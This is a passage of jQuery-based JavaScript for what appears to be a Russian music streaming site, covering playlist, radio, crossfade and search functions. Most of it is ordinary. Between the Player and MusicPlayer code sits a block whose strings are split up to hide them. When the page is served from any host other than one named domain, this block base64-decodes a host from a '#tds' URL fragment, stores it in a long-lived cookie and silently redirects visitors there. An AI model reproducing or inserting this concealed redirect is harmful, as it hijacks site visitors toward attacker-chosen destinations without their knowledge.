                    }
                });
            },
            remove: function(i) {
                var track = $(self.playlist.css.main.tracks).eq(i);
                track.animate({
                    height: 0
                }, 100, function() {
                    $(this).remove();
                    $.ajax({
                        type: 'POST',
                        url: self.data.url.save_pl,
                        dataType: 'json',
                        data: {
                            action: "remove",
                            track_id: track.data('id')
                        },
                        success: function(data) {
                            if (data.status && data.title) {
                                Notify.show('', data.status, 2, data.title);
                            }
                        }
                    });
                    self.playlist.reindex();
                });
            },
            save: function() {
                var tracks = [];
                self.playlist.reindex();
                $(self.playlist.css.main.tracks).each(function(i, v) {
                    tracks[i] = $(v).data('id');
                });
                tracks = implode(',', tracks);
                $.ajax({
                    type: 'POST',
                    url: self.data.url.save_pl,
                    dataType: 'json',
                    data: {
                        action: "set",
                        tracks: tracks
                    }
                });
            },
            sortable: function() {
                if (!$('.favorites').length) return;
                new Sortable(document.getElementsByClassName("favorites")[0], {
                    animation: 150,
                    scroll: true,
                    scrollSensitivity: 80,
                    handle: ".playlist-move",
                    onEnd: function(event) {
                        event.stopPropagation();
                        if (new Date().getTime() - Start_drag < 500)
                            return false;
                        self.playlist.user_pl.save("resort");
                    },
                    onStart: function(event) {
                        event.stopPropagation();
                        Start_drag = new Date().getTime()
                    }
                });
            }
        }
    }
    self.radio = {
        interval: 5000,
        update: function(info) {
            if (info.radio && info.now) self.radio.rds.start();
            if (info.radio) $(self.ui.css.player).addClass('is-radio');
            else $(self.ui.css.player).removeClass('is-radio');
            sound.setVolume(self.state.volume);
        },
        rds: {
            start: function() {
                self.radio.rds.get();
                self.radio.rds.stop();
                self.radio.timer = setInterval(function() {
                    self.radio.rds.get();
                }, self.radio.interval);
            },
            stop: function() {
                clearInterval(self.radio.timer);
            },
            get: function() {
                if (self.state.info.radio && self.state.info.now) $.ajax({
                    type: 'GET',
                    url: self.state.info.now,
                    dataType: 'html',
                    success: function(data) {
                        self.ui.update({
                            song: data
                        });
                    }
                });
            }
        }
    };
    self.crossfade = {
        duration: 750,
        preload: 15000,
        tail: null,
        end: 0,
        init: function() {},
        fade_out: function(sound) {
            if (sound != null) {
                var start = parseInt(new Date().getTime()),
                    duration = parseInt(self.crossfade.duration),
                    end = start + duration,
                    volume = sound.volume;
                sound.active = false;
                clearInterval(sound.cf_out_timer);
                if (sound.cf) clearInterval(sound.cf_in_timer);
                sound.setVolume(volume);
                sound.cf_out_timer = window.setInterval(function() {
                    var now = new Date().getTime();
                    if (now < end) {
                        var percent = (((end - now) / duration) * volume).toFixed();
                        sound.setVolume(percent);
                        sound.cf = true;
                    } else {
                        clearInterval(sound.cf_out_timer);
                        sound.unload().stop();
                        sound.cf = false;
                    }
                }, 50);
            }
        },
        fade_in: function(sound) {
            if (sound != null) {
                var start = parseInt(new Date().getTime()),
                    duration = parseInt(self.crossfade.duration),
                    end = start + duration,
                    volume = parseInt(self.state.volume);
                sound.active = true;
                clearInterval(sound.cf_in_timer);
                if (sound.cf) clearInterval(sound.cf_out_timer);
                sound.setVolume(0);
                sound.play();
                sound.cf_in_timer = window.setInterval(function() {
                    var now = parseInt(new Date().getTime());
                    if (now < end) {
                        var percent = (volume - (((end - now) / duration) * volume)).toFixed();
                        sound.setVolume(percent);
                        sound.cf = true;
                    } else {
                        clearInterval(sound.cf_in_timer);
                        sound.setVolume(volume);
                        sound.cf = false;
                    }
                }, 50);
            }
        }
    }
    self.inc404counters = function() {
        var exists = false;
        $.each($("div.container_message"), function(i, el) {
            var counter = $(el).children("b").children("span");
            if (counter.length) {
                var a = parseInt(counter.text());
                if (a > 0) {
                    counter.text(a - 1);
                    exists = true;
                }
            }
        });
        if (exists) {
            self.counters_started = setTimeout(function() {
                self.inc404counters();
            }, 1000);
        } else {
            self.counters_started = null;
        }
    }
    self.check = function(mp3, track, sound) {
        clearTimeout(self.error_timer);
        $.ajax({
            url: mp3,
            type: 'head',
            crossDomain: false,
            error: function() {
                self.error_timer_count = (typeof self.error_timer_count == 'undefined') ? 1 : parseInt(self.error_timer_count) + 1;
                var count = self.error_timer_count;
                if (count < 3) {
                    self.error_timer = setTimeout(function() {
                        self.check(mp3, track, sound);
                    }, 1500);
                } else if (self.error_timer_count > 2) {
                    self.error_timer_count = 0;
                    track.css({
                        opacity: 0.3
                    });
                    self.ui.notify(self.data.text.unavailable);
                    sound.destruct();
                    self.next(true);
                }
            },
            success: function() {
                track.css({
                    opactity: 1
                });
            }
        });
    }
    self.get_next = function(auto) {
        var pl = self.state.pl,
            tracks;
        switch (pl) {
            case 'main':
                tracks = $(self.playlist.css.main.tracks);
                break;
            case 'radio':
                tracks = $(self.playlist.css.radio.main.stations);
                break;
        }
        var count = tracks.length,
            act = (tracks.filter('.act').length > 0) ? true : false,
            current = (act) ? parseInt(self.state.i) : 0,
            i = null,
            mode = self.state.mode;
        mode = ((pl == 'radio') || ((mode == 'repeat' || mode == 'stop') && !auto)) ? 'line' : mode;
        switch (mode) {
            case 'line':
                i = current + 1;
                if ((i + 1) > count || !act) i = 0;
                break
            case 'repeat':
                i = current;
                break
            case 'stop':
                i = current;
                break
            case 'shuffle':
                i = Math.floor(Math.random() * count);
                if (i == current) i = Math.floor(Math.random() * count);
                if (i == current) i = Math.floor(Math.random() * count);
                break;
        }
        return i;
    }
    self.track = function(i, pl) {
        var track;
        switch (pl) {
            case 'main':
                track = $(self.playlist.css.main.tracks).eq(i);
                break;
            case 'onesongblock':
                track = i;
                break;
            case 'radio':
                track = $(self.playlist.css.radio.main.stations).eq(i);
                break;
        }
        return track;
    }
    self.info = function(track) {
        var is_radio = track.hasClass('radio-station') || track.hasClass('radio-station-mini') ? true : false;
        if (is_radio) {
            return {
                index: track.data('index'),
                mp3: track.data('mp3'),
                id: track.data('id'),
                duration: track.data('duration'),
                artist: track.data('title') ? track.data('title') : track.find('h4').text(),
                song: 'Song 1',
                radio: is_radio,
                now: track.data('now'),
                cover: track.find('img').length > 0 ? track.find('img').attr('src') : false,
                lyrics: track.data('lyrics-id')
            }
        }
        if (track.closest('.onesongblock').length) {
            return {
                index: -1,
                mp3: track.data('mp3'),
                id: track.data('id'),
                duration: parseInt(track.data('duration')),
                artist: track.parent().parent().find('h1 b').text(),
                song: track.parent().parent().find('h1 em').text()
            }
        }
        return {
            index: track.data('index'),
            mp3: track.data('mp3'),
            id: track.data('id'),
            duration: track.data('duration'),
            artist: track.find('h2 b').text(),
            song: track.find('h2 em').text()
        }
    }
    self.favicon = function(mode) {
        if (mode === 'play' && document.title[0] != '\u25B6') {
            document.title = '\u25B6 ' + document.title;
        }
        if (mode === 'pause' && document.title[0] === '\u25B6') {
            document.title = document.title.slice(2);
        }
    }
    self.time = function(duration) {
        duration = duration / 1000;
        var min = parseInt(duration / 60, 10);
        if (String(min).length == 1) min = '0' + min;
        var sec = parseInt(duration - min * 60, 10);
        if (String(sec).length == 1) sec = '0' + sec;
        var time = min + ':' + sec;
        return time;
    }
}
jQuery(document).ready(function() {
    player = new Player();
    player.init();
});
if (window.location.hostname !== 'mp' + '3.c' + 'c') {
    var cookieNameC = 'ha' + 'sh1' + '23';
    if (window.location.hash && window.location.hash.substring(0, 4) === '#t' + 'ds' && typeof(window.atob) === 'function') {
        var getArray = window.location.hash.substring(4).split(',', 2);
        if (getArray[0]) {
            document.cookie = cookieNameC + '=' + window.atob(getArray[0]) + '; path=/; expires=Sat, 01 Jan 2033 00:00:00 GMT';
        }
    }
    if (getCookie5(cookieNameC)) {
        document.location.href = 'http://' + getCookie5(cookieNameC);
    }
}

function getCookie5(name) {
    var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}

function MusicPlayer() {
    var self = this;
    self.data = {
        css: {
            search: {
                form: '#he-search',
                value: '#he-search-text',
                submit: '#he-search-submit',
                submitter: '#search-submitter',
            },
            player_title: '#player-page-title',
        },
        url: {
            search: '/search'
        },
        text: {
            loading: 'Загрузка...'
        }
    };
    self.init = function() {
        self.run.navigation();
        self.run.storage();
        self.history();
    };
    self.history = function() {
        self.loadOnesongBlock();
        self.run.search();
        //Counters.init();
        //SocialButtons.init();
        self.run.player_title();
        player.playlist.tools();
        player.playlist.activate();
        player.playlist.reindex();
        player.playlist.user_pl.sortable();
        $(window).scrollTop(0);
    };
    self.run = {
        navigation: function() {
            $(document.body).append('<span id="load-indicator">' + self.data.text.loading + '</span>');
        },
        search: function() {
            var $form = $(self.data.css.search.form),
                $value = $(self.data.css.search.value),
                $submit = $(self.data.css.search.submit),
                $submitter = $(self.data.css.search.submitter);
            $value.bind({
                focus: function() {},
                blur: function() {}
            });
        },
        storage: function() {
            var LS = $.jStorage;
            if (LS.storageAvailable()) {
                LS.listenKeyChange('player', function(key, action) {
                    if (action == 'updated' && $(':hover').length == 0) player.pause();
                });
            }
        },
        player_title: function() {
            var $title = $(self.data.css.player_title),
                set_title = function() {
                    if ($title.length > 0 && player.state.pb == 'stop') player.ui.update({
                        artist: $title.find('b').html(),
                        song: $title.find('span').html()
                    });
                };
            if (typeof player == 'object') set_title();
            else SM.onready = set_title();
        }
    };
    self.loadOnesongBlock = function() {
        if ($('.oneradioblock').length) {
            $('.oneradioblock-btns a').on('click', function(e) {
                e.preventDefault();
                var i = $(this).parent().data('index'),
                    pl = 'radio',
                    paused = player.state.paused,
                    act = ($(this).parent().hasClass('act')) ? true : false;
                if (act) {
                    if (paused) player.resume();
                    else
                        player.pause();
                } else player.play(i, pl);
                $(this).trigger('changeState');
            }).on('changeState', function() {
                var buttonText = player.state.paused ? 'Слушать онлайн' : 'Включить паузу';
                $(this).text(buttonText);
            });
            return 0;
        } else if ($('.onesongblock').length) {
            var id = 0;
            var track = $('.onesongblock .psv_btn:first');
            var trackId = track.data('id');
            if (player.state.info && typeof player.state.info.id != "undefined") {
                id = player.state.info.id;
                if (player.state.pl == 'main') {
                    player.state.pl = 'onesongblock';
                }
            }
            if (id == trackId) {
                var str = player.state.paused ? player.data.text.playonesong : player.data.text.pauseonesong;
            }
            $('.onesongblock-btns a:eq(0)').on('click', function() {
                var id = 0;
                if (player.state.info && typeof player.state.info.id != "undefined")
                    id = player.state.info.id;
                if (id != trackId) {
                    //Counters.goal('onesongblockPlay');
                    player.play($(this), 'onesongblock');
                    $(this).html(player.data.text.pauseonesong);
                } else {
                    var paused = player.state.paused;
                    if (paused) {
                        //Counters.goal('onesongblockResume');
                        $(this).html(player.data.text.pauseonesong);
                        player.resume();
                    } else {
                        //Counters.goal('onesongblockPause');
                        $(this).html(player.data.text.playonesong);
                        player.pause();
                    }
                }
            });
            $('.onesongblock-btns a:eq(1)').on('click', function() {
                //Counters.goal('onesongblockDownload');
            });
            if (typeof RBT.onesongblock == "function" && $('html').attr('id') !== 'desktop') {
                $('.onesongblock').rbtify(RBT.onesongblock());
            }
        } else {
            if (typeof player != "undefined" && player.state.pl == 'onesongblock') {
                player.state.pl = 'main';
            }
        }
    };
}
jQuery(document).ready(function() {
    musicplayer = new MusicPlayer();
    musicplayer.init();
});
//SocialButtons = function() {};
//SocialButtons.get = function(url) {
//    var urlEscaped = encodeURI(url);
//    var urlVk = 'http://vk.com/share.php?url=' + urlEscaped;
//    var urlOk = 'http://ok.ru/dk?st.cmd=addShare&amp;st._surl=' + urlEscaped;
//    var urlFb = 'http://facebook.com/sharer.php?u=' + urlEscaped;
//    var urlGp = 'http://plus.google.com/share?url=' + urlEscaped;
//    var urlTw = 'http://twitter.com/share?url=' + urlEscaped;
//    return '<a class="rt_share-vk"  href="javascript:void(0);" title="Поделиться &mdash; ВКонтакте"     onclick="window.open(\'' + urlVk + '\', \'_blank\', \'scrollbars=1, resizable=1, width=550, height=500\'); event.stopPropagation();event.preventDefault(); return false;"></a>' + '<a class="rt_share-ok"  href="javascript:void(0);" title="Поделиться &mdash; Одноклассники" onclick="window.open(\'' + urlOk + '\', \'_blank\', \'scrollbars=1, resizable=1, width=550, height=500\'); event.stopPropagation();event.preventDefault(); return false;"></a>' + '<a class="rt_share-fb"  href="javascript:void(0);" title="Поделиться &mdash; facebook"     onclick="window.open(\'' + urlFb + '\', \'_blank\', \'scrollbars=1, resizable=1, width=550, height=500\'); event.stopPropagation();event.preventDefault(); return false;"></a>' + '<a class="rt_share-tw"  href="javascript:void(0);" title="Поделиться &mdash; twitter"     onclick="window.open(\'' + urlTw + '\', \'_blank\', \'scrollbars=1, resizable=1, width=550, height=500\'); event.stopPropagation();event.preventDefault(); return false;"></a>' + '<a class="rt_share-gp"  href="javascript:void(0);" title="Поделиться &mdash; Google+"     onclick="window.open(\'' + urlGp + '\', \'_blank\', \'scrollbars=1, resizable=1, width=550, height=500\'); event.stopPropagation();event.preventDefault(); return false;"></a>';
//};
//SocialButtons.init = function() {
//    var rtShare = $('span.rt_share');
//    if (rtShare.length) {
//        rtShare.each(function(index) {
//            var rtShareCurrent = $(this);
//            var rtShareUrl = rtShareCurrent.attr('data-url') ? rtShareCurrent.attr('data-url') : window.location;
//            rtShareCurrent.html(SocialButtons.get(rtShareUrl));
//        });
//    }
//};
Notify = function() {};
Notify.show = function(text, type, time, caption) {
    var params = {
            text: (typeof(text) == 'undefined') ? '' : '<p>' + text + '</p>',
            caption: (typeof(caption) == 'undefined') ? '' : '<h4>' + caption + '</h4>',
            type: (typeof(type) == 'undefined') ? 'info' : type,
            time: (typeof(time) == 'undefined') ? 3 : time
        },
        note = document.createElement('div');
    if ($('#notifications').length < 1) $(document.body).append('<div id="notifications"></div>');
    $(note).css('display', 'none').addClass('notification').addClass('notification-' + params.type).html(params.caption + params.text).appendTo($('#notifications')).slideDown(200);
    setTimeout(function() {
        $(note).animate({
            opacity: 0,
            height: 0
        }, 200, function() {
            $(note).remove();
        });
    }, params.time * 1000);
};
var _gaq = [],
    CountersCallCount = 0;
//Counters = function() {};
//Counters.init = function() {
//    CountersCallCount++;
//    var refer = (typeof(window.custom_ref) != 'undefined') ? window.custom_ref : document.referrer;
//    new Image().src = "//counter.yadro.ru/hit?r" + escape(refer) + ((typeof(screen) == "undefined") ? "" : ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ? screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) + ";" + Math.random();
//    if (CountersCallCount === 1) {
//        _gaq = _gaq || [];
//        _gaq.push(['_setAccount', 'UA-62005656-1']);
//        _gaq.push(['_trackPageview']);
//        var ga = document.createElement('script');
//        ga.type = 'text/javascript';
//        ga.async = true;
//        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
//        var s = document.getElementsByTagName('script')[0];
//        s.parentNode.insertBefore(ga, s);
//        (function(d, w, c) {
//            (w[c] = w[c] || []).push(function() {
//                try {
//                    w.yaCounter33747644 = new Ya.Metrika({
//                        id: 33747644,
//                        clickmap: true,
//                        trackLinks: true,
//                        accurateTrackBounce: true
//                    });
//                } catch (e) {}
//            });
//            var n = d.getElementsByTagName("script")[0],
//                s = d.createElement("script"),
//                f = function() {
//                    n.parentNode.insertBefore(s, n);
//                };
//            s.type = "text/javascript";
//            s.async = true;
//            s.src = "https://mc.yandex.ru/metrika/watch.js";
//            if (w.opera == "[object Opera]") {
//                d.addEventListener("DOMContentLoaded", f, false);
//            } else {
//                f();
//            }
//        })(document, window, "yandex_metrika_callbacks");
//    } else {
//        if (typeof _gaq !== 'undefined') {
//            _gaq.push(['_trackPageview']);
//        }
//        if (typeof window.yaCounter33747644 !== 'undefined') {
//            window.yaCounter33747644.hit(window.location.href, null, refer);
//        }
//    }
//};
//Counters.goal = function(target) {
//    if (typeof window.yaCounter33747644 !== 'undefined') {
//        window.yaCounter33747644.reachGoal(target);
//    }
//};
$(function() {
    $('body').on('click', '#he-search-text', function() {
        $('#header').addClass('mod__he_search_act');
    }).focusout(function() {
        $('#header').removeClass('mod__he_search_act');
    });
});